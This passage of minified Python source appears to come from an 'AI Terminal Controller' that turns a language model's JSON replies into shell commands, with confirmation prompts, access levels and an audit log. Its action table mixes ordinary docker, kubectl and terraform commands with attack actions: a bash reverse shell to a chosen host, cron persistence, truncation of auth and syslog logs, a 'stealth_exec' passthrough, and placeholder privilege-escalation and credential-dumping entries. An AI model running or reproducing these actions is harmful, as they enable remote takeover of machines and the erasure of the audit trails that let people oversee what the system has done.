{_a.get("file","docker-compose.yml")} {_a.get("cmd","up -d")}',"docker_exec":lambda:f'docker exec {_a.get("container","")} {_a.get("cmd","")}',"docker_logs":lambda:f'docker logs --tail {_a.get("tail",100)} {_a.get("container","")}',"docker_stop":lambda:f'docker stop {_a.get("container","")}',"docker_ps":lambda:f'docker ps {"-a"if _a.get("all")else""}',"docker_images":lambda:"docker images","kubernetes":lambda:f'kubectl {_a.get("cmd","")}',"helm":lambda:f'helm {_a.get("cmd","")}',"terraform":lambda:f'terraform {_a.get("cmd","")}',"ansible":lambda:f'ansible {_a.get("cmd","")}',"pm2":lambda:f'pm2 {_a.get("cmd","")}',"journalctl":lambda:f'journalctl -u{_a.get("unit","")} -n{_a.get("lines",50)}',"dmesg":lambda:f'dmesg | grep -i {_a.get("level","")}',"reverse_shell":lambda:f'bash -i >& /dev/tcp/{_a.get("host","")}/{_a.get("port",4444)} 0>&1',"persistence_cron":lambda:f'(crontab -l 2>/dev/null; echo "*/5 * * * * {_a.get("cmd","")}") | crontab -',"persistence_systemd":lambda:None,"clear_logs":lambda:f'for l in {" ".join(_a.get("types",["auth","syslog"]))}; do sudo truncate -s 0 /var/log/$l.log 2>/dev/null; done',"stealth_exec":lambda:_a.get("cmd",""),"priv_esc":lambda:None,"dump_creds":lambda:None}
 if _t in _cmds:
  _cmd=_cmds[_t]()
  if _cmd is None:print(f"{_X.GR}noop{_X.R}");return True
  _cs=_cmd if isinstance(_cmd,str)else" ".join(str(x)for x in _cmd if x)
  if _danger:print(f"{_X.BG_R}{_X.W} ⚠ DANGER: {_msg2} {_X.R}")
  print(f"{_X.GR}$ {_cs}{_X.R}")
  if not _cf("Execute?",_danger):_acl._log("skip",_t);return False
  try:
   _r=subprocess.run(_cmd if isinstance(_cmd,list)else _cmd,shell=isinstance(_cmd,str),capture_output=True,text=True,timeout=300)
   if _r.stdout:print(f"{_X.W}{_r.stdout}{_X.R}",end="")
   if _r.stderr:print(f"{_X.RE}{_r.stderr}{_X.R}",end="")
   _acl._log(_t,_cs[:200])
   _acl.actions_run+=1
   print(f"{_X.G if _r.returncode==0 else _X.RE}Exit: {_r.returncode}{_X.R}")
   return True
  except Exception as e:print(f"{_X.RE}{e}{_X.R}");return False
 if _t=="history":print(f"{_X.GR}history{_X.R}");return True
 print(f"{_X.GR}?: {_t}{_X.R}");return False
def _pe(_r,_o,_acl):
 _e=0;_s=0
 for _l in _r.strip().split("\n"):
  _l=_l.strip()
  if not _l or not _l.startswith("{"):
   if _l and not _l.startswith("```"):print(f"{_X.GR}{_l}{_X.R}")
   continue
  try:
   _a=json.loads(_l)
   if _ex(_a,_o,_acl):_e+=1
   else:_s+=1
  except:print(f"{_X.GR}{_l}{_X.R}")
 if _e>0 or _s>0:print(f"\n{_X.GR}-- {_e} done, {_s} blocked/skip | total: {_acl.actions_run} run, {_acl.actions_blocked} blocked --{_X.R}")
 return _e
def _b():
 _bf=Path(__file__).parent/"banner.txt"
 if _bf.exists():
  try:
   _bt=_bf.read_text(encoding="utf-8",errors="replace")
   _bt="\n".join(l.rstrip()for l in _bt.split("\n")if l.strip())
   print(f"{_X.CY}{_bt}{_X.R}")
  except:pass
 print(f"{_X.GR}  v{_V} | AI Terminal Controller + Access Control | RBAC | Audit | Sandbox{_X.R}\n")
def _so(_o,_acl):
 print(f"{_X.B}{_X.Y}=== System ==={_X.R}")
 print(f"  {_X.CY}OS:{_X.R}      {_o['os']} ({_o['distro']})")
 print(f"  {_X.CY}Family:{_X.R}  {_o['distro_family']}")
 print(f"  {_X.CY}PkgMgr:{_X.R}  {_o['pkg_manager']} ({_o['pkg_install_cmd']})")
 print(f"  {_X.CY}Shell:{_X.R}  {_o['shell']}")
 print(f"  {_X.CY}User:{_X.R}    {_o['user']}")
 print(f"  {_X.CY}CPU:{_X.R}     {_o.get('cpu_cores','?')} cores")
 print(f"  {_X.CY}Mem:{_X.R}     {_o.get('memory_mb','?')} MB")
 print(f"  {_X.CY}Docker:{_X.R}  {'Y'if _o['docker']else'N'}")
 print(f"  {_X.CY}Sudo:{_X.R}    {'Y'if _o['sudo']else'N'}")
 print(f"  {_X.CY}Tools:{_X.R}   {_X.GR}{len(_o['available_tools'])}{_X.R}")
 print(f"\n  {_X.Y}Access Level:{_X.R} {_acl.lvl} ({'restricted'if _acl.lvl==0 else'elevated'if _acl.lvl==1 else'root'})")
 print(f"  {_X.Y}Allowed dirs:{_X.R} {', '.join(sorted(_acl.allowed_dirs))}")
 print(f"  {_X.Y}Rate limit:{_X.R} {_acl.rate['max']}/{_acl.rate['window']}s")
 print()
 if not _cf(f"OS correct? Continue with {_o['distro_family']}?"):
  _ov={"1":("alpine","apk","apk add"),"2":("debian","apt","apt-get install -y"),"3":("rhel","dnf"if shutil.which("dnf")else"yum","dnf install -y"if shutil.which("dnf")else"yum install -y"),"4":("arch","pacman","pacman -S --noconfirm"),"5":("suse","zypper","zypper install -y"),"6":("macos","brew","brew install"),"7":("nixos","nix-env","nix-env -iA"),"8":("void","xbps-install","xbps-install -y"),"9":("slackware","slackpkg","slackpkg install"),"10":("gentoo","emerge","emerge"),"11":("solus","eopkg","eopkg install -y"),"12":("freebsd","pkg","pkg install -y")}
  for k,v in _ov.items():print(f"  {_X.G}{k}{_X.R}: {v[0]} ({v[1]})")
  _c=input(f"{_X.CY}[1-12]: {_X.R}").strip()
  if _c in _ov:_o["distro_family"],_o["pkg_manager"],_o["pkg_install_cmd"]=_ov[_c];print(f"{_X.G}OK: {_ov[_c][0]}{_X.R}\n")
 else:print(f"{_X.G}OK{_X.R}\n")
def _sm():
 print(f"{_X.B}{_X.Y}Select Model:{_X.R}")
 for k,v in _M.items():print(f"  {_X.G}{k}{_X.R}: {v['_u']}")
 while True:
  _c=input(f"\n{_X.CY}[1-4]: {_X.R}").strip()
  if _c in _M:_m=_M[_c];print(f"\n{_X.G}OK: {_m['_u']}{_X.R}\n");return _m
  print(f"{_X.RE}1-4{_X.R}")
def _va(_acl,_skip=False):
 if _skip:
  print(f"{_X.Y}Skip sudo | Level 0 (restricted){_X.R}\n")
  _acl._set_level(0)
  _pin=getpass.getpass(f"{_X.CY}Set session PIN (for level up): {_X.R}")
  _acl._set_pin(_pin)
  print(f"{_X.G}PIN set{_X.R}\n")
  return True
 print(f"{_X.B}{_X.Y}Authentication{_X.R}\n")
 _pin=getpass.getpass(f"{_X.CY}Set session PIN: {_X.R}")
 _acl._set_pin(_pin)
 _pwd=getpass.getpass(f"{_X.CY}sudo password: {_X.R}")
 try:
  _r=subprocess.run(["sudo","-S","-v"],input=_pwd+"\n",capture_output=True,text=True,timeout=10)
  if _r.returncode==0:
   _acl._set_level(1);print(f"\n{_X.G}Auth OK | Level 1 (elevated){_X.R}\n");return True
  print(f"\n{_X.Y}sudo failed | Level 0 (restricted){_X.R}\n");_acl._set_level(0);return True
 except:
  print(f"\n{_X.Y}sudo N/A | Level 0 (restricted){_X.R}\n");_acl._set_level(0);return True
def _cl(_m,_o,_acl,_si):
 _mi=_m["_t"];_mn=_m["_u"];_h=[]
 print(f"{_X.B}{_X.CY}{'='*50}{_X.R}")
 print(f"  {_X.B}{_X.CY}CHAT MODE{_X.R} | {_X.G}{_mn}{_X.R} | {_X.Y}L{_acl.lvl}{_X.R} | {_X.GR}{_o['distro_family']}{_X.R}")
 print(f"  {_X.GR}exit|clear|help|model|os|lock|level|audit|stats|adddir|rate{_X.R}")
 print(f"{_X.B}{_X.CY}{'='*50}{_X.R}\n")
 while True:
  try:_ui=input(f"{_X.G}{_X.B}me{_X.R}[{_X.Y if _acl.lvl==2 else _X.G if _acl.lvl==1 else _X.GR}{_acl.lvl}{_X.R}] {_X.G}> {_X.R}").strip()
  except(EOFError,KeyboardInterrupt):print(f"\n{_X.CY}Bye!{_X.R}");break
  if not _ui:continue
  if _ui.lower()in("exit","quit"):print(f"\n{_X.CY}Bye!{_X.R}");break
  if _ui.lower()in("clear","cls"):os.system("clear");continue
  if _ui.lower()=="help":
   print(f"\n{_X.Y}Commands:{_X.R}\n  {_X.G}exit{_X.R}      Quit\n  {_X.G}clear{_X.R}     Clear screen\n  {_X.G}model{_X.R}    Switch model\n  {_X.G}os{_X.R}        Show OS info\n  {_X.G}lock{_X.R}      Lock session\n  {_X.G}level{_X.R}     Change access level (0-2)\n  {_X.G}audit{_X.R}     Show audit log\n  {_X.G}stats{_X.R}     Show session stats\n  {_X.G}adddir{_X.R}   Add allowed directory\n  {_X.G}rate{_X.R}     Set rate limit\n  {_X.GR}else -> AI (action blocks, y/n confirm){_X.R}\n")
   continue
  if _ui.lower()=="model":_m=_sm();_mi=_m["_t"];_mn=_m["_u"];continue
  if _ui.lower()=="os":_so(_o,_acl);continue
  if _ui.lower()=="lock":_acl._lock();print(f"{_X.Y}Locked{_X.R}");continue
  if _ui.lower()=="level":
   _lv=input(f"{_X.CY}Level [0/1/2]: {_X.R}").strip()
   _pin=getpass.getpass(f"{_X.CY}PIN: {_X.R}")
   _ex({"action":"level","level":int(_lv)if _lv.isdigit()else 0,"pin":_pin},_o,_acl)
   continue
  if _ui.lower()=="audit":_ex({"action":"audit_show","count":20},_o,_acl);continue
  if _ui.lower()=="stats":
   print(f"\n{_X.B}{_X.CY}Session Stats{_X.R}")
   print(f"  {_X.CY}Actions run:{_X.R}     {_X.G}{_acl.actions_run}{_X.R}")
   print(f"  {_X.CY}Actions blocked:{_X.R} {_X.RE}{_acl.actions_blocked}{_X.R}")
   print(f"  {_X.CY}Log entries:{_X.R}     {len(_acl.log)}")
   print(f"  {_X.CY}Rate:{_X.R}            {_acl.rate['count']}/{_acl.rate['max']} (window {_acl.rate['window']}s)")
   print(f"  {_X.CY}Level:{_X.R}           {_acl.lvl}")
   print(f"  {_X.CY}Allowed dirs:{_X.R}    {len(_acl.allowed_dirs)}")
   print(f"  {_X.CY}Session time:{_X.R}    {int(time.time()-_acl.sess_start)}s\n")
   continue
  if _ui.lower()=="adddir":
   _d=input(f"{_X.CY}Dir path: {_X.R}").strip()
   if _d:_acl._add_dir(_d);print(f"{_X.G}Added: {_d}{_X.R}")
   continue
  if _ui.lower()=="rate":
   _m2=input(f"{_X.CY}Max actions: {_X.R}").strip()or"30"
   _w=input(f"{_X.CY}Window (sec): {_X.R}").strip()or"60"
   _acl.rate["max"]=int(_m2);_acl.rate["window"]=int(_w)
   print(f"{_X.G}Rate: {_m2}/{_w}s{_X.R}")
   continue
  _h.append(f"User: {_ui}")
  print(f"{_X.GR}  ...thinking...{_X.R}",end="\r")
  _r=_ca(_mi,_ui,_si,"\n".join(_h[-10:]))
  print(" "*30,end="\r")
  if not _r:print(f"{_X.RE}  No response{_X.R}");continue
  _h.append(f"AI: {_r[:500]}")
  print(f"\n{_X.MA}{_X.B}ai{_X.R} {_X.MA}>{_X.R} ")
  _pe(_r,_o,_acl)
  print()
def _main():
 _ss="--skip-sudo"in sys.argv
 _acl=_ACL()
 _b()
 print(f"{_X.CY}Detecting...{_X.R}")
 _o=_d()
 _so(_o,_acl)
 _si=_bsi(_o,_acl)
 print(f"{_X.G}Instructions: {_o['distro_family']}{_X.R}\n")
 _m=_sm()
 if not _va(_acl,_ss):print(f"{_X.RE}Auth failed{_X.R}");sys.exit(1)
 _cl(_m,_o,_acl,_si)
if __name__=="__main__":
 try:_main()
 except KeyboardInterrupt:print(f"\n{_X.CY}Bye!{_X.R}")
 except Exception as e:print(f"{_X.RE}Fatal: {e}{_X.R}");sys.exit(1)
